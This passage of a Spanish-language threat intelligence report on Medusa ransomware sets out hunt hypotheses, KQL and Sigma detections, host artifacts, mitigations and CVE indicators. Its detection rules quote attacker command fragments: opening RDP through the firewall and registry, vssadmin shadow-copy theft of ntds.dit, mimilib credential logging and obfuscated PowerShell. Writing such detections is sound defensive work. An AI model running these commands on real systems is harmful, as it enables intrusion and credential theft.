**H-6 — Hay una regla de cortafuegos y un valor de registro que abrieron el escritorio remoto.** El guion `openrdp.bat` hace tres cosas en tres líneas: añade una regla de entrada para el puerto 3389 llamada `rdp`, habilita el grupo de reglas de gestión remota, y pone a cero el valor de registro que deniega las conexiones de escritorio remoto. Cazar las tres, y en particular **el nombre literal de la regla**. Fidelidad: muy alta por lo específico. Falsos positivos: administradores que habilitan escritorio remoto a mano, que son a su vez un hallazgo de proceso.

**H-7 — Hay un `rclone` disfrazado.** El actor renombra la herramienta de exfiltración a `lsp.exe` y su fichero de configuración a `ngconf.txt`. Cazar: esos dos nombres; **y el patrón generalizable**, que es un ejecutable cuyo comportamiento de red sea de sincronización masiva hacia un destino externo con independencia de su nombre, y la presencia de un fichero de configuración con secciones de proveedor de almacenamiento remoto. Fidelidad: alta para los literales, media-alta para el patrón. **Nota de cartera: `rclone` ya está en el grafo de este repositorio por `CTI-2026-025`, con otro actor y otro nombre falso.** Es la tercera vez que esta herramienta aparece: conviene tener la detección hecha una vez y bien.

**H-8 — Nuestra plataforma de despliegue de software desplegó algo que no decidimos desplegar.** La caza que cubre la etapa de impacto y la que casi nadie tiene. Revisar el historial de la plataforma de despliegue de software y de la de gestión de endpoints: paquetes, guiones y tareas creados en los últimos doce meses, con su autor y su fecha. Señales: un paquete que ejecute una orden de PowerShell codificada; uno que copie un ejecutable a la carpeta de sistema; uno con nombres como `RunFileCopy.cmd` o `command.cmd`. Fidelidad: muy alta. **Y el control que se deriva de la caza:** esa plataforma debería requerir doble aprobación para crear paquetes, porque es la vía por la que un adversario cifra diez mil equipos en diez minutos.

**H-9 — Hay una interfaz web de administración remota de una línea en un servidor.** El aviso publica el contenido literal: un fichero PHP que ejecuta lo que reciba por petición si un parámetro coincide con una clave fija de cuatro caracteres. Cazar: ficheros PHP de menos de doscientos bytes bajo la raíz de un servidor web que contengan una llamada de ejecución de sistema; **y la clave fija literal**, que es concluyente. Y en el tráfico, peticiones a una ruta de guardado de ficheros con parámetros de clave y de orden. Fidelidad: muy alta.

**H-10 — La lista de indicadores, pero filtrada antes.** Retrohunt convencional con los Anexos A.2 y A.3, **con la instrucción obligatoria de filtrar primero**. El propio aviso advierte que algunos de sus indicadores pueden ser legítimos: en la lista hay direcciones de un proveedor comercial de VPN y de proveedores de nube. **Buscarlas retrospectivamente sí; bloquearlas sin verificar, no.** Fidelidad: alta para el retrohunt, **negativa como lista de bloqueo sin filtrar**.

**H-11 — ¿Cuánto tardamos de verdad, y qué nos cubre mientras tanto?** Caza de alcance regional y, en realidad, un ejercicio de medición propia. Dos números: el tiempo real desde la publicación de un aviso crítico en uno de los cuatro tipos de producto del Anexo A.1 hasta el parche en producción; y **el inventario de controles que nos protegerían durante ese plazo si el exploit ya estuviera circulando**. El primero suele estar medido; el segundo casi nunca. Fidelidad: no aplica. **Es la caza que convierte `KJ-2` de dato en decisión, y es `E-d`.**

**H-12 — ¿Qué tenemos expuesto de las cuatro categorías que este actor prefiere?** Caza de alcance regional. No las cuatro vulnerabilidades: **las cuatro categorías de producto** —administración remota, transferencia de ficheros, gestión de dispositivos de seguridad y gestión de accesos privilegiados—. Escaneo externo propio buscando sus interfaces web y sus puertos característicos. **Contexto regional:** estos cuatro tipos de producto son exactamente los que una organización mediana de la región despliega para dar soporte remoto a sedes dispersas y para intercambiar ficheros con terceros, y los que con más frecuencia quedan publicados por comodidad operativa. Fidelidad: no aplica; es inventario y es `E-c`.

## T-5. Brechas de visibilidad que hay que cerrar primero

| Brecha | Por qué importa aquí |
|---|---|
| **Sin registro de DNS saliente, o sin retención de 12 meses** | Deja ciega `H-1`, que es la única caza que detecta explotación confirmada **antes** del cifrado. **Es la peor brecha posible en este expediente** |
| Sin inventario fiable de software | Deja ciega `H-2`. Y el adversario elige por mimetismo: **su ventaja es exactamente nuestra ignorancia del inventario** |
| **Sin inventario de las exclusiones del antivirus** | Deja ciega `H-3`. No es telemetría: es una consulta a la consola del producto que ya tenemos |
| Sin registro de línea de comandos completa | Deja ciegas `H-4`, `H-6` y la mitad de `H-8`: los discriminadores están en los argumentos |
| Sin auditoría del historial de la plataforma de despliegue de software | Deja ciega `H-8`, que cubre la etapa de impacto. **Esa plataforma es la vía por la que se cifran diez mil equipos a la vez** |
| Sin correlación de eventos de instantánea de volumen en controladores de dominio | Deja ciega `H-5`, que distingue un equipo comprometido de un dominio comprometido |
| Sin lista de bloqueo de controladores vulnerables activada | No es visibilidad sino prevención, y cubre el paso en que el adversario **mata el producto que proporciona toda la demás visibilidad** |
| **Sin lista de ventanas de prueba de intrusión autorizadas** | No es una brecha técnica: es la condición para que `H-1` y `D-1` no generen falsos positivos. **Y debería existir con independencia de este informe** |

---

# NIVEL TÉCNICO
### Para: Ingeniería de detección · Automatización · TIP/SIEM · Vida útil: días–semanas

## X-1. Arsenal y capacidad

| Propiedad | Valor |
|---|---|
| Encriptador | **`gaze.exe`** en Windows y **`gaze.py`** en Linux. **AES-256.** Extensión `.medusa`. Detiene servicios de copia, seguridad, bases de datos, comunicación, compartición y web; borra instantáneas; cifra; deja la nota |
| Despliegue del encriptador | **PsExec**, plataforma comercial de despliegue de software, o agente de gestión de endpoints. En Linux, transferencia segura de ficheros y ejecución desacoplada del terminal |
| Guion de despliegue | Orden de PowerShell codificada que **excluye la unidad `C:` completa del antivirus**; copia del encriptador a la carpeta de sistema con `robocopy` mediante `RunFileCopy.cmd`; verificación y ejecución mediante `command.cmd` |
| Enumeración | Escáneres comerciales de red; PowerShell y consola de comandos; WMI. Puertos 21, 22, 23, 80, 115, 443, 1433, 3050, 3128, 3306, 3389 |
| Transferencia de herramientas | **`certutil`**, para evitar la detección al descargar |
| Volcado de credenciales | **Mimikatz**, el administrador de tareas de Windows y **una biblioteca del sistema** para volcar el proceso de autenticación local. Desactivan el antivirus durante la exfiltración y lo reactivan después |
| Credenciales persistentes | **`mimilib.dll` añadido a los paquetes de seguridad del registro** → contraseñas en claro en `C:\Windows\System32\kiwissp.log` |
| Credenciales de dominio | **Instantánea de volumen** → copia de `ntds.dit`, `system` y `security` → borrado de la instantánea → **billetes Kerberos falsificados** |
| Enumeración de red | **CrackMapExec** (también conocido como NetExec o NXC): dirección, nombre de anfitrión, sistema operativo y otros metadatos |
| Ofuscación de PowerShell | **Tres niveles crecientes:** orden codificada en base64; troceado de la cadena de descarga y referencia por variable; y carga en base64 descomprimida en memoria, convertida en bloque de guion, con operador de formato y tres reemplazos de carácter. **La última carga es idéntica a un guion público de etapa** que crea consola inversa o de escucha sobre TLS en el puerto 443 |
| Antidetección | **Controladores vulnerables o firmados para matar o borrar el producto de detección de endpoint**; **colocación de herramientas en carpetas ya excluidas del antivirus**; borrado del historial de PowerShell; borrado de las propias herramientas al terminar |
| Mando y control y túnel | Herramienta de túnel inverso; servicio de exposición de aplicaciones por nube; **herramienta pública de monitorización de servidores** instalada con PowerShell desde su repositorio; agente de gestión remota de endpoints; **interfaz web en PHP de una línea con clave fija**; consola inversa de Linux por redirección a un descriptor de red; herramienta de conexión entre redes privadas |
| Administración remota | **Ocho productos comerciales**, elegidos **según los que ya estén presentes en el entorno de la víctima** |
| Movimiento lateral | Escritorio remoto, **PsExec** y `openrdp.bat` |
| Elevación por política | **Política de dominio por defecto puesta en «habilitada y forzada»** para sobreescribir políticas de grupo más estrictas |
| Exfiltración | **`Bandizip`** para empaquetar y **`Rclone`** para subir, renombrados a `lsp.exe` y `ngconf.txt`. Lotes pequeños —ficheros de credenciales, *hives*— por el **portapapeles del escritorio remoto** |
| Impacto adicional | **Apagado remoto de las máquinas virtuales y cifrado**; **cambio de las contraseñas de administrador del anfitrión de virtualización** mediante perfil de anfitrión |
| Extorsión | 48 h para el primer contacto, por chat en Tor o mensajería cifrada. Contacto directo por teléfono o correo si no hay respuesta. Sitio `.onion` con cuenta atrás; **10.000 $ por añadir un día**; venta de los datos a terceros antes de que expire; descuentos por pago rápido; demandas **basadas en los ingresos publicados de la víctima**; pago habitualmente en Bitcoin |

## X-2. Artefactos de host persistentes

<!-- cti:cards -->

| Categoría | Artefactos | Etiqueta |
|---|---|---|
| **Registro de credenciales en claro** | `C:\Windows\System32\kiwissp.log` · valor `Security Packages` de la autoridad de seguridad local con `mimilib` añadido a la lista | `concluyente, sin uso legítimo` |
| **Apertura de escritorio remoto** | Regla de cortafuegos de entrada **llamada `rdp`** en el puerto 3389 · grupo de reglas de gestión remota habilitado · `fDenyTSConnections` a `0` | `tres líneas, muy específicas` |
| **Exfiltración disfrazada** | `lsp.exe` (es `rclone`) · `ngconf.txt` (es su configuración) · uso de `rdpclip.exe` para lotes pequeños | `el nombre falso es el indicador` |
| **Despliegue del encriptador** | `gaze.exe` · `gaze.py` · `RunFileCopy.cmd` · `command.cmd` · paquete de la plataforma de despliegue con orden de PowerShell codificada | `caza en la plataforma, no en el puesto` |
| **Interfaz web de una línea** | Fichero PHP que ejecuta lo recibido si un parámetro coincide con una **clave fija de cuatro caracteres**; ruta de guardado de ficheros | `menos de 200 bytes` |
| **Consola inversa de Linux** | Redirección de consola interactiva a un descriptor de red hacia la dirección del atacante, puertos 4444 o 443 | `patrón clásico, sigue funcionando` |
| **Resultado del cifrado** | Extensión `.medusa` · nota de rescate · instantáneas borradas · servicios detenidos · **máquinas virtuales apagadas y cifradas** | `cuando se ve esto, ya es tarde` |
| **Lo que NO queda** | Las propias herramientas del adversario, **borradas al terminar** | `degrada la investigación posterior` |

## X-3. Lógica de detección prioritaria

<!-- cti:detections -->

**D-1 · CRÍTICO — Verificación de explotación fuera de banda, con nuestro nombre dentro**

```
dns.question.name MATCHES "(?i)\\.(oast\\.site|oast\\.pro|oast\\.fun)$"
AND NOT time.window IN <ventanas de prueba de intrusión autorizadas>
// Segunda rama, y es la que de verdad importa:
OR (dns.question.name MATCHES "(?i)(oast\\.(site|pro|fun))"
    AND dns.question.name CONTAINS_ANY (<nuestro nombre>, <nuestras marcas>,
                                        <nuestros dominios>, <nuestro dominio AD>))
```

→ **Incidente, no alerta. Activación del equipo de respuesta y búsqueda inmediata del servicio explotado.** Es la detección de mayor valor del informe por un motivo estructural: **el adversario necesita que esa consulta salga a Internet, y mete el nombre de la víctima dentro de ella**. Un acierto significa **explotación exitosa, confirmada por el propio atacante, y antes del cifrado**. Único falso positivo conocido: pruebas de intrusión legítimas, porque el servicio es una herramienta estándar del oficio — **de ahí la condición de la ventana autorizada, que hay que construir antes de armar la regla**.

**D-2 · CRÍTICO — Herramienta de administración remota no autorizada**

```
(process.name IN ("AnyDesk.exe","AteraAgent.exe","ScreenConnect*","eHorus*",
                  "ba_service*","N-able*","BeyondTrust*","SimpleHelp*",
                  "SRService.exe","Splashtop*","MeshAgent*","nezha*")
 OR service.name MATCHES "(?i)(anydesk|atera|screenconnect|ehorus|n-?able|beyondtrust|simplehelp|splashtop|meshagent|nezha)")
AND NOT (host.name IN <equipos autorizados> AND process.name IN <productos autorizados>)
```

→ **Alerta crítica e investigación.** La clave de esta regla es la última línea: **no detecta un producto, detecta la falta de autorización**, porque el adversario escoge deliberadamente el que ya está en el entorno. Requiere que exista la lista de autorizados, que es `E-b`. **Prioridad de investigación:** una herramienta presente en un solo equipo, o instalada fuera de la ventana de cambios, o con servicio registrado en un servidor en los últimos días.

**D-3 · CRÍTICO — Paquete de seguridad no legítimo en la autoridad de seguridad local**

```
(registry.path MATCHES "(?i)\\\\CurrentControlSet\\\\Control\\\\Lsa\\\\Security Packages"
 AND registry.value NOT IN <valor legítimo conocido del sistema>)
OR file.path MATCHES "(?i)\\\\System32\\\\kiwissp\\.log$"
OR file.name == "mimilib.dll"
```

→ **Contención automática.** No hay uso legítimo. La segunda condición —la existencia del fichero de registro— es la más limpia: **si ese fichero existe, hay contraseñas en claro en disco y el incidente está en curso.**

**D-4 · CRÍTICO — Instantánea de volumen usada para robar la base del directorio**

```
SAME host WITHIN 30m, ALL OF:
  (1) process.command_line MATCHES "(?i)vssadmin.*create shadow"
  (2) file.access MATCHES "(?i)(ntds\\.dit|\\\\config\\\\(SYSTEM|SECURITY))"
      AND process.name NOT IN <procesos legítimos de copia de seguridad>
  (3) process.command_line MATCHES "(?i)vssadmin.*delete shadow"
AND host.role == "domain_controller"
```

→ **Contención automática y declaración de compromiso de dominio.** Si esta regla acierta, **hay que asumir billetes Kerberos falsificables** y la respuesta incluye la rotación doble de la clave de la cuenta de servicio del directorio. La tercera condición —el borrado de la instantánea— es la que distingue la actividad maliciosa de una copia de seguridad legítima.

**D-5 · ALTO — Apertura de escritorio remoto por `openrdp.bat`**

```
process.command_line CONTAINS_ANY (
  "advfirewall firewall add rule name=\"rdp\"",
  "firewall set rule group=\"windows management instrumentation (wmi)\" new enable=yes",
  "fDenyTSConnections /t REG_DWORD /d 0")
```

→ **Alerta alta e investigación.** El nombre literal de la regla de cortafuegos —`rdp`— es el discriminador. Las tres condiciones juntas en el mismo equipo son concluyentes.

**D-6 · ALTO — PowerShell ofuscado en los tres niveles documentados**

```
process.name IN ("powershell.exe","pwsh.exe")
AND (
  process.command_line MATCHES "(?i)-e(nc|ncodedcommand)?\\s+[A-Za-z0-9+/=]{80,}"
  OR process.command_line MATCHES "(?i)('[A-Za-z]{1,4}'\\s*\\+\\s*){3,}"
  OR process.command_line CONTAINS_ALL ("GzipStream","FromBase64String","scriptblock")
  OR process.command_line CONTAINS_ALL ("MemoryStream","Decompress","ReadToEnd")
)
```

→ **Alerta alta.** Las cuatro ramas corresponden a los tres niveles de ofuscación que el aviso documenta. **La segunda rama —cadenas cortas concatenadas— es la más específica y la menos conocida:** la ofuscación por troceado de un nombre de método es un patrón que un administrador legítimo no produce.

**D-7 · CRÍTICO — Despliegue de software no autorizado desde nuestra propia plataforma**

```
// Esta deteccion vive en la plataforma de despliegue, no en el endpoint.
deployment.package_created OR deployment.package_executed
WHERE package.author NOT IN <administradores autorizados>
   OR package.content CONTAINS_ANY ("-enc","MpPreference","ExclusionPath",
                                    "robocopy","RunFileCopy","command.cmd")
   OR package.target_count > <umbral de despliegue masivo>
```

→ **Contención automática del despliegue y verificación telefónica.** Es la detección que cubre la etapa de impacto, y la que **casi nadie tiene**, porque la plataforma de despliegue de software se considera infraestructura propia y no superficie de ataque. **Y el control que la acompaña es más importante que la regla: doble aprobación para crear paquetes.**

**D-8 · ALTO — Interfaz web de administración remota de una línea**

```
(file.created.extension == "php"
 AND file.size < 400
 AND file.content MATCHES "(?i)(system|exec|shell_exec|passthru|popen)\\s*\\("
 AND file.path MATCHES "(?i)(/var/www|/inetpub|/wwwroot|/html|/public)")
OR http.request.uri MATCHES "(?i)/file_save"
OR http.request.body CONTAINS "key=UerT"
```

→ **Alerta alta, aislamiento del servidor y recogida del fichero.** La última condición —la clave fija de cuatro caracteres— es concluyente. Y la primera rama es genérica y útil mucho más allá de este expediente.

**D-9 · ALTO — Rclone disfrazado, o cualquier sincronización masiva saliente**

```
(file.name IN ("lsp.exe","ngconf.txt")
 OR (process.command_line MATCHES "(?i)(copy|sync|move)\\s+.*(remote|:)"
     AND process.hash IN <hashes conocidos de rclone en cualquier versión>))
OR (network.bytes_out > <umbral> AND network.destination.category == "cloud_storage"
    AND process.name NOT IN <clientes de nube autorizados>)
```

→ **Alerta alta y bloqueo del flujo.** La detección por **hash de la herramienta con independencia de su nombre** es la robusta: el adversario cambia el nombre, no el binario. **Nota de cartera:** `rclone` aparece ya en el grafo de este repositorio por `CTI-2026-025`, con otro actor y otro nombre falso. **Es la tercera vez: conviene que esta detección esté hecha una vez y bien, y sirva para todos.**

> ⚠ **Regla de operación.** Cuatro detecciones admiten contención automática:
> `D-3` y `D-4` por su fidelidad y por lo que está en juego, `D-7` por la
> velocidad del impacto que previene, y `D-1` **no debe automatizar contención
> sino activación del equipo de respuesta**, porque lo que indica no es una
> máquina infectada sino **un servicio nuestro recién explotado**, y lo que hay
> que hacer es encontrar ese servicio. Y una prohibición expresa: **no cargar
> el Anexo A.3 en un bloqueo sin filtrar antes**, porque contiene direcciones
> de un proveedor comercial de VPN y de proveedores de nube, y el propio aviso
> pide verificarlas.

## X-4. Consultas de caza

```kql
// H-1 y D-1 · La consulta mas valiosa del informe.
// Un acierto NO es una sospecha: es explotacion confirmada por el atacante,
// con el nombre de la victima dentro, y antes del cifrado.
let nombres = dynamic(["<nuestro nombre>","<marca 1>","<marca 2>","<dominio AD>"]);
DeviceNetworkEvents
| where Timestamp > ago(365d)
| where RemoteUrl has_any ("oast.site","oast.pro","oast.fun")
| extend ContieneNombre = tostring(RemoteUrl) has_any (nombres)
| project Timestamp, DeviceName, RemoteUrl, ContieneNombre,
          InitiatingProcessFileName, InitiatingProcessCommandLine
| order by ContieneNombre desc, Timestamp desc
// Si ContieneNombre es true, abrir incidente. Si es false, comprobar si hubo
// una prueba de intrusion autorizada en esa ventana.
```

```kql
// H-2 y D-2 · Herramientas de administracion remota: las que HAY, no las autorizadas.
let rmm = dynamic(["anydesk","atera","screenconnect","connectwise","ehorus",
                   "n-able","nable","beyondtrust","simplehelp","splashtop",
                   "meshagent","meshcentral","nezha","teamviewer","rustdesk"]);
union
( DeviceTvmSoftwareInventory | where tolower(SoftwareName) has_any (rmm)
  | project DeviceName, Fuente = "inventario", Detalle = SoftwareName ),
( DeviceProcessEvents | where Timestamp > ago(365d)
  | where tolower(FileName) has_any (rmm) or tolower(ProcessCommandLine) has_any (rmm)
  | project DeviceName, Fuente = "proceso", Detalle = FileName ),
( DeviceEvents | where Timestamp > ago(365d) | where ActionType == "ServiceInstalled"
  | where tolower(tostring(AdditionalFields.ServiceName)) has_any (rmm)
  | project DeviceName, Fuente = "servicio nuevo", Detalle = tostring(AdditionalFields.ServiceName) )
| summarize Fuentes = make_set(Fuente), Detalles = make_set(Detalle, 10),
            Equipos = dcount(DeviceName) by DeviceName
| order by Equipos asc
// Prioridad de investigacion: las que aparecen en UN SOLO equipo.
```

```kql
// H-4 y D-3 · Paquete de seguridad no legitimo y su fichero de registro.
union
( DeviceRegistryEvents
  | where Timestamp > ago(365d)
  | where RegistryKey has @"\Control\Lsa" and RegistryValueName =~ "Security Packages"
  | where RegistryValueData has "mimilib" or RegistryValueData !has "wdigest"
  | project Timestamp, DeviceName, Senal = "registro", RegistryValueData,
            InitiatingProcessCommandLine
),
( DeviceFileEvents
  | where Timestamp > ago(365d)
  | where FileName =~ "kiwissp.log" or FileName =~ "mimilib.dll"
  | project Timestamp, DeviceName, Senal = strcat("fichero: ", FileName),
            RegistryValueData = FolderPath, InitiatingProcessCommandLine
)
| order by Timestamp desc
```

```kql
// H-5 y D-4 · Instantanea de volumen para robar la base del directorio.
// Las TRES condiciones juntas. El borrado de la instantanea es la que
// distingue esto de una copia de seguridad legitima.
let ventana = 30m;
DeviceProcessEvents
| where Timestamp > ago(365d)
| where ProcessCommandLine has "vssadmin" or ProcessCommandLine has "ntds.dit"
     or ProcessCommandLine has_all ("reg save","hklm\\system")
| summarize Ordenes = make_set(ProcessCommandLine, 20), N = count()
         by DeviceName, bin(Timestamp, ventana)
| where N >= 2
| order by N desc
```

```kql
// H-3 y E-e · Que hay DENTRO de nuestras exclusiones del antivirus.
// Primera parte: volcar las exclusiones (desde la consola del producto).
// Segunda parte, que es la que nadie hace: mirar que ficheros viven ahi.
let exclusiones = dynamic(["<ruta excluida 1>","<ruta excluida 2>","<ruta excluida 3>"]);
DeviceFileEvents
| where Timestamp > ago(365d)
| where FolderPath has_any (exclusiones)
| where FileName endswith ".exe" or FileName endswith ".dll"
     or FileName endswith ".ps1" or FileName endswith ".bat"
| summarize Ficheros = make_set(FileName, 30), Primero = min(Timestamp),
            Creadores = make_set(InitiatingProcessFileName, 10)
         by DeviceName, FolderPath
| order by Primero desc
// Un ejecutable dentro de una carpeta excluida que se creo para una base de
// datos es el hallazgo. Y casi siempre hay alguno.
```

```yaml
# Sigma — Verificacion de explotacion fuera de banda
title: Consulta DNS a servicio de verificacion fuera de banda
id: 7b1e4f92-6c38-4a05-9d71-2e84c05b3f17
status: stable
description: >
  Medusa usa un servicio publico de verificacion fuera de banda para confirmar
  que un exploit ha funcionado, embebiendo el nombre de la victima en el
  subdominio. Un acierto es explotacion confirmada, no sospecha, y ocurre
  antes del cifrado.
author: Celula CTI
date: 2026-11-17
references:
  - https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-071a
tags:
  - attack.reconnaissance
  - attack.t1595
  - attack.initial_access
  - attack.t1190
logsource:
  category: dns_query
detection:
  dominios:
    QueryName|endswith:
      - '.oast.site'
      - '.oast.pro'
      - '.oast.fun'
  condition: dominios
falsepositives:
  - Pruebas de intrusion autorizadas: el servicio es una herramienta estandar
    del oficio. Mantener una lista de ventanas autorizadas y correlacionar
level: critical
```

```yaml
# Sigma — Paquete de seguridad no legitimo en la autoridad de seguridad local
title: mimilib anadido a Security Packages, o aparicion de kiwissp.log
id: 2e9c5a84-3b17-4d60-8f92-6a04e1c73b58
status: stable
description: >
  Medusa anade la biblioteca de Mimikatz a los paquetes de seguridad del
  subsistema de autenticacion, lo que registra las contrasenas en claro en un
  fichero del directorio de sistema. No hay uso legitimo.
author: Celula CTI
date: 2026-11-17
tags:
  - attack.credential_access
  - attack.t1003.001
  - attack.persistence
logsource:
  category: registry_set
  product: windows
detection:
  clave:
    TargetObject|contains: '\Control\Lsa\Security Packages'
  valor:
    Details|contains: 'mimilib'
  condition: clave and valor
falsepositives:
  - Ninguno conocido
level: critical
```

```yaml
# Sigma — Apertura de escritorio remoto con el patron de openrdp.bat
title: Regla de cortafuegos "rdp" y desactivacion de fDenyTSConnections
id: 6f28b073-9d41-4e52-a816-3c70f5b9a2e4
status: stable
description: >
  Guion openrdp.bat de Medusa, ejecutado con PsExec: regla de entrada en 3389
  llamada literalmente "rdp", habilitacion del grupo de reglas de gestion
  remota, y puesta a cero del valor de registro que deniega escritorio remoto.
author: Celula CTI
date: 2026-11-17
tags:
  - attack.lateral_movement
  - attack.t1021.001
  - attack.defense_evasion
logsource:
  category: process_creation
  product: windows
detection:
  regla_rdp:
    CommandLine|contains: 'firewall add rule name="rdp"'
  regla_wmi:
    CommandLine|contains: 'windows management instrumentation (wmi)" new enable=yes'
  registro:
    CommandLine|contains: 'fDenyTSConnections'
    CommandLine|contains: '/d 0'
  condition: regla_rdp or regla_wmi or registro
falsepositives:
  - Administradores que habilitan escritorio remoto a mano: es a su vez un
    hallazgo de proceso
level: high
```

## X-5. Mitigaciones de configuración con efecto directo

| Control | Corta |
|---|---|
| **Retirar de Internet las interfaces de administración remota, transferencia de ficheros, gestión de dispositivos de seguridad y gestión de accesos privilegiados** | **La etapa 01 por su vía principal, y es la medida que no depende del parche.** Las cuatro vulnerabilidades del Anexo A.1 son exactamente de esas cuatro categorías |
| **Autenticación multifactor en todo acceso remoto**, incluidas las herramientas de administración remota de terceros | La etapa 01 por la vía de credenciales, que es la que alimenta el mercado de accesos |
| **Lista blanca de herramientas de administración remota, con bloqueo por ejecución y por egreso del resto** | **La etapa 02 por su vía preferente.** El adversario elige la que ya está: si sólo puede existir una, la de más es visible |
| **Inventario, aprobación y revisión periódica de las exclusiones del antivirus** | La ocultación de la etapa 02. **Una lista de exclusiones sin dueño es una carpeta donde cualquier adversario trabaja sin ser visto** |
| **Lista de bloqueo de controladores vulnerables activada** | El paso en que el adversario **mata el producto que proporciona toda la demás visibilidad**. Sin esto, las detecciones de `X-3` pueden no llegar a dispararse |
| **Doble aprobación para crear paquetes en la plataforma de despliegue de software** | **La etapa 03 completa.** Es la vía por la que se cifran diez mil equipos en diez minutos, y es infraestructura propia |
| Protección del proceso de autenticación local y restricción de carga de paquetes de seguridad | El volcado de credenciales y la persistencia de `kiwissp.log` |
| Restricción de `vssadmin` y vigilancia de accesos a la base del directorio en controladores de dominio | El robo de credenciales de dominio y los billetes Kerberos falsificados |
| **Copias de seguridad inmutables o fuera de línea, y prueba de restauración suponiendo perdida la plataforma de virtualización y cambiadas sus credenciales** | **La etapa 03 en lo que de verdad importa.** El adversario apaga y cifra las máquinas virtuales y cambia las contraseñas del anfitrión: **un plan que suponga disponible la consola de virtualización no es aplicable** |
| Autenticación multifactor en la consola del anfitrión de virtualización, y credenciales distintas de las del dominio | El cambio de contraseñas de administrador del anfitrión |
| Segmentación efectiva que limite el alcance de `PsExec` y del escritorio remoto entre segmentos | El movimiento lateral de la etapa 02, **y es parte de la segunda capa de `E-d`** |
| Alerta y bloqueo de cambios en la política de dominio por defecto | La elevación por política, que es el paso que desactiva las demás restricciones de golpe |

---

## 14. Brechas de inteligencia y nuevos requisitos de colección

| # | Brecha | Impacto en el juicio | Requisito propuesto | Prioridad |
|---|---|---|---|---|
| G-1 | **El canal de suministro de exploits anterior a la divulgación no está identificado.** La fuente afirma su existencia y declara desconocer el origen | `KJ-2` es el juicio de más consecuencias del informe y su mecanismo es opaco. **No se puede saber qué productos o qué procesos de divulgación están comprometidos** | Vigilar `I-4`. Y, en lo propio, **asumir la hipótesis y dotar `E-d`**: la segunda capa de defensa es válida con independencia de quién venda los exploits | **Crítica** |
| G-2 | **Sin telemetría propia.** `O-4` sin evaluar | La única pregunta que importa —si estamos dentro— no tiene respuesta aquí | Ejecutar `H-1` —retrohunt de DNS, 12 meses— y `H-3` —exclusiones del antivirus—, que son las dos comprobaciones que convierten `O-4` en hallazgo sin comprar nada | **Crítica** |
| G-3 | **Sin datos por país para la región, y los recuentos disponibles son del adversario** | `KJ-5` queda en confianza baja y por ausencia de evidencia. **Y `H6`, la inferencia de exposición regional alta, se queda sin medir** | `I-5`: consulta a los CSIRT nacionales. **Y una alternativa que no depende de nadie:** medir la exposición regional de las cuatro categorías de producto del Anexo A.1 con datos públicos de escaneo | Alta |
| G-4 | **Las cifras de víctimas no son comparables entre fuentes**, y una de ellas discrepa incluso en el año de inicio de la operación | Cualquier serie temporal construida mezclando fuentes es inválida. `E-3` usa sólo los dos puntos del aviso por este motivo | **Regla de higiene, no requisito de colección: no mezclar recuentos de aviso con recuentos de rastreador en un mismo gráfico.** Y declarar siempre la fuente de cada cifra | Media |
| G-5 | **Ninguna fuente pública establece la nacionalidad ni la estructura humana del grupo** | No se puede evaluar la probabilidad de acción policial ni la de disolución, que son las dos variables que más afectarían al pronóstico de `E-3` | Vigilar `I-6`. **Y no inferir nacionalidad**: este informe no lo hace y conviene que la convención se mantenga | Baja |
| G-6 | **El caso del cobro posterior al pago es único**, y la fuente ofrece dos interpretaciones opuestas | `KJ-7` queda en confianza baja, y con él la base de evidencia de `E-f`. **Aunque la decisión de política de pago es la misma en ambas lecturas** | `I-8`: un segundo caso discriminaría. Mientras tanto, `E-f` se decide con la evidencia que hay, que es suficiente para la decisión aunque no para el juicio | Media |
| G-7 | **No sabemos qué nos cubriría si el exploit llegara antes del parche** | Es `KJ-3` sin verificar. **Y es la única brecha de esta tabla que podemos cerrar nosotros solos en una reunión** | `H-11`: inventariar los controles que protegen durante la ventana de parcheo, y decidir si bastan. **Es el ejercicio que convierte este informe en una decisión** | **Crítica** |

---

# ANEXOS

## Anexo A — Indicadores de compromiso

> ⚠ **Leer antes de usar. Cuatro advertencias, y la segunda es la del propio
> aviso.**
>
> **Primera, de procedencia.** El aviso publica **cuatro paquetes STIX 2.1**:
> XML y JSON de la versión de marzo de 2025, y XML y JSON de la actualización
> de agosto de 2026. **Los de 2026 son la fuente preferente para ingesta.** Lo
> que sigue es una selección razonada con fecha, para lectura humana y para el
> índice con contexto de este repositorio, subordinada al original.
>
> **Segunda, y la hace la fuente con sus palabras: «algunos de estos
> indicadores pueden ser legítimos. Las agencias recomiendan que las
> organizaciones investiguen o verifiquen los indicadores antes de actuar, por
> ejemplo antes de bloquear.»** En la lista hay direcciones de **un proveedor
> comercial de VPN** —el actor las usó para acceder a una interfaz web de
> administración remota— y de **proveedores de nube reasignables**. Bloquearlas
> sin filtrar significa bloquear a usuarios legítimos de ese proveedor, que
> pueden ser nuestros propios empleados o nuestros clientes. **Está marcado
> fila por fila.**
>
> **Tercera, de prioridad.** El nivel más valioso de este anexo es el **A.1**
> —cuatro vulnerabilidades— y, dentro del A.3, **los tres dominios de
> verificación fuera de banda**, que son el único indicador del informe que
> detecta explotación confirmada **antes** del cifrado.
>
> **Cuarta, de desambiguación.** Todo lo que sigue corresponde a **Medusa
> (RaaS)**. No a MedusaLocker, no al malware móvil del mismo nombre, y **no al
> *rootkit* `MEDUSA` de Linux que ya figura en el grafo de este repositorio por
> `CTI-2026-028`**. Es `KJ-6` y `E-g`.

### A.1 — Vulnerabilidades de acceso inicial · **y las cuatro son de la misma clase de producto**

<!-- cti:ioc -->

| Tipo | Valor | Contexto | Confianza | Caducidad | Acción permitida |
|---|---|---|---|---|---|
| cve | `CVE-2024-1709` | **ScreenConnect.** Elusión de autenticación por ruta o canal alternativo. **Herramienta de asistencia remota: privilegios altos por diseño y pensada para estar accesible** | Alta | Sin caducidad: la decisión es de parcheo y de exposición | **Parchear, y retirar de exposición directa** |
| cve | `CVE-2023-48788` | **Fortinet EMS.** Inyección SQL. **Gestor de dispositivos de un fabricante de seguridad: compromete el plano de gestión de la propia defensa** | Alta | Sin caducidad | **Parchear, y retirar el plano de gestión de Internet** |
| cve | `CVE-2025-10035` | **Fortra GoAnywhere.** Deserialización de datos no confiables. **Servidor de transferencia de ficheros: por definición accesible desde fuera y con datos de terceros** | Alta | Sin caducidad | **Parchear, y revisar qué datos custodiaba** |
| cve | `CVE-2026-1731` | **BeyondTrust.** Inyección de comandos del sistema operativo. **Producto de gestión de accesos privilegiados: el compromiso entrega las credenciales que custodia.** El aviso señala que los actores **aprovecharon su anuncio de febrero de 2026 para identificar qué explotar** | Alta | Sin caducidad | **Parchear con prioridad máxima, y rotar todo lo que custodiara** |
